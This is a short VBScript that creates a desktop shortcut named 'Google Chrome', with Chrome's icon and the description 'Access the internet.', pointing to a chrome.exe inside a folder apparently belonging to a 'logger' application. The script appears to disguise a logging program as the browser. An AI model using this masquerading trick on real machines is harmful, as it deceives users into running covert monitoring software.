Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\Users\Dell\Desktop\Google Chrome.LNK"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Users\Dell\my-applications\logger\chrome.exe"
' oLink.Arguments = ""
oLink.Description = "Access the internet."   
' oLink.HotKey = "ALT+CTRL+F"
oLink.IconLocation = "C:\Users\Dell\my-applications\logger\src\assets\chrome.ico"
oLink.WindowStyle = "1"   
' oLink.WorkingDirectory = "C:\Program Files\MyApp"
oLink.Save